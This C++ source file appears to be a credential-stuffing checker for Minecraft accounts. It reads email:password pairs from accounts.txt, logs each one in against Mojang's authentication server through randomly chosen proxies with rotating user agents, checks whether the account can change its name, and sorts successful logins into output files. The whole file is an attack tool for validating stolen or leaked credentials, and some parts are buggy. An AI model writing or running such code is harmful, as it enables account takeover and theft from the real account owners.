#pragma warning( disable : 4996)
#define CURL_STATICLIB 
#include <iostream>
#include <curl/curl.h>
#include <fstream>
#include <filesystem>
#include <regex>
#include "json.hpp"
#include <thread>
using json = nlohmann::json;

using ::std::array;
using ::std::cout;
using ::std::endl;
using ::std::regex;
using ::std::ref;
#define MAX_THREADS 200
using namespace std;

//For CURL, ignore
size_t writeFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
	data->append((char*)ptr, size * nmemb);
	return size * nmemb;
}


//List of UserAgents
string user_agent()
{
	srand(time(0));
	string choices[] = {
		"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_6_8) AppleWebKit/5360 (KHTML, like Gecko) Chrome/36.0.811.0 Mobile Safari/5360",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/5332 (KHTML, like Gecko) Chrome/37.0.859.0 Mobile Safari/5332",
		"Opera/9.28 (X11; Linux i686; en-US) Presto/2.8.300 Version/12.00",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/5321 (KHTML, like Gecko) Chrome/40.0.831.0 Mobile Safari/5321",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5321 (KHTML, like Gecko) Chrome/37.0.853.0 Mobile Safari/5321",
		"Opera/8.67 (X11; Linux i686; en-US) Presto/2.8.225 Version/11.00",
		"Opera/8.77 (Windows CE; en-US) Presto/2.12.326 Version/10.00",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/35.0 Mobile/15E148 Safari/605.1.15",
		"Mozilla/5.0 (iPad; CPU OS 11_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/35.0 Mobile/15E148 Safari/605.1.15",
		"Mozilla/5.0 (iPod touch; CPU iPhone OS 11_5_1 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/35.0 Mobile/15E148 Safari/605.1.15",
		"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1"
	};
	string random;
	for (int i = 0; i < 3; i++)
	{
		random = choices[rand() % 5];
	}
	return random;
}

string list1;
string grabproxy() {
	string line;
	vector<string> lines;

	srand(time(0));

	ifstream file("proxies.txt");

	int total_lines = 0;
	while (getline(file, line))
	{
		total_lines++;
		lines.push_back(line);
	}

	int random_number = rand() % total_lines;

	//cout << lines[random_number];
	return lines[random_number];

}

//Check if account is eligble for name change
string canwechangename(string auth) {
	string proxy = grabproxy();
	auto curl = curl_easy_init();
	std::string response_string;
	std::string header_string;
	try {
		string url = "https://api.minecraftservices.com/minecraft/profile/namechange";
		if (curl) {

			struct curl_slist* slist1;
			slist1 = NULL;
			slist1 = curl_slist_append(slist1, "Content-Type: application/json");

			curl_easy_setopt(curl, CURLOPT_URL, url);
			curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
			curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
			curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent());
			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, slist1);
			curl_easy_setopt(curl, CURLOPT_XOAUTH2_BEARER, auth);
			curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BEARER);
			curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 50L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, "8000");
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			char* url;
			double elapsed;
			long response_code;
			curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
			curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &elapsed);
			curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &url);

			curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			curl = NULL;
		}
		try {
			string status1;
			nlohmann::json jsonData = nlohmann::json::parse(response_string);
			bool status = jsonData["nameChangeAllowed"];
			if (status == true) {
				status1 = "True";
			}
			if (status == false) {
				status1 = "False";
			}
			return status1;
		}
		catch (const std::exception& e)
		{
			return "0";
		}
	}
	catch (const std::exception& e)
	{
		return "0";
	}
}

//Get username based off Auth Key
string getmyusername(string auth) {
	string proxy = grabproxy();
	try {
		auto curl = curl_easy_init();
		std::string response_string;
		std::string header_string;
		string url = "https://api.minecraftservices.com/minecraft/profile";
		if (curl) {

			struct curl_slist* slist1;
			slist1 = NULL;
			slist1 = curl_slist_append(slist1, "Content-Type: application/json");

			curl_easy_setopt(curl, CURLOPT_URL, url);
			curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
			curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
			curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent());
			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, slist1);
			curl_easy_setopt(curl, CURLOPT_XOAUTH2_BEARER, auth);
			curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BEARER);
			curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 50L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, "8000");
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			char* url;
			long response_code;
			double elapsed;
			curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
			curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &elapsed);
			curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &url);

			curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			curl = NULL;
		}

		try {
			nlohmann::json jsonData = nlohmann::json::parse(response_string);
			string name = jsonData["name"];
			return name;
		}
		catch (const std::exception& e)
		{
			nlohmann::json jsonData = nlohmann::json::parse(response_string);
			string error = jsonData["error"];
			if (error == "NOT_FOUND") {
				error = "NO USERNAME ON ACCOUNT";
			}
			return error;
		}
	}
	catch (const std::exception& e)
	{
		return "0";
	}
}



//Login to Minecraft Account (Get Auth)
string mclogin(string username, string password) {
	auto curl = curl_easy_init();
	std::string response_string;
	std::string header_string;

	std::string jsonstr = "{\"agent\": {\"name\": \"Minecraft\", \"version\": 1}, \"username\": \"" + username + "\", \"password\": \"" + password + "\", \"requestUser\": true}";

	try {
		string url = "https://authserver.mojang.com/authenticate";
		if (curl) {

			struct curl_slist* slist1;
			slist1 = NULL;
			slist1 = curl_slist_append(slist1, "Content-Type: application/json");

			curl_easy_setopt(curl, CURLOPT_URL, url);
			curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonstr.c_str());
			curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
			curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent());
			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, slist1);
			curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 50L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, "8000");
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			char* url;
			double elapsed;
			long response_code;
			curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
			curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &elapsed);
			curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &url);

			curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			curl = NULL;

			try {
				nlohmann::json jsonData = nlohmann::json::parse(response_string);
				string key = jsonData["accessToken"];
				return key;
			}
			catch (const std::exception& e)
			{
				return "0";
			}
		}
	}
	catch (const std::exception& e)
	{
		return "0";
	}
}

int main() {

	system("color 3");

	//cout << "Enter proxy file: ";
	//cin >> list1;

	string delay;
	cout << "Delay per check (in seconds): ";
	cin >> delay;
	int delay1 = stoi(delay);


	ifstream file("accounts.txt");
	string content;
	while (file >> content) {

		string account = content;
		std::string delimiter = ":";
		std::string email = account.substr(0, account.find(delimiter[0]));
		std::string password = account.substr(int(email.length()), account.find(delimiter[0]));
		password = std::regex_replace(password, std::regex(":"), "");

		string auth = mclogin(email, password);
		if (auth == "0") {
			cout << "[-] LOGIN FAILED -> " << account << "\n";
			std::ofstream log("failed.txt", std::ios_base::app | std::ios_base::out);
			log << account << "\n";
		}
		else {
			string result = canwechangename(auth);
			string username = getmyusername(auth);
			if (result == "True") {
				cout << "[-] LOGIN SUCCESS (" << username << ") [Eligble for name change] -> " << account << "\n";
				std::ofstream log("working_canchange.txt", std::ios_base::app | std::ios_base::out);
				log << account << "\n";
			}
			else {
				cout << "[-] LOGIN SUCCESS (" << username << ") [Cannot change name] -> " << account << "\n";
				std::ofstream log("working_cannotchange.txt", std::ios_base::app | std::ios_base::out);
				log << account << "\n";
			}
		}
		this_thread::sleep_for(chrono::seconds(delay1));
	}
	cout << "Finished! Files saved.";
	system("pause");

}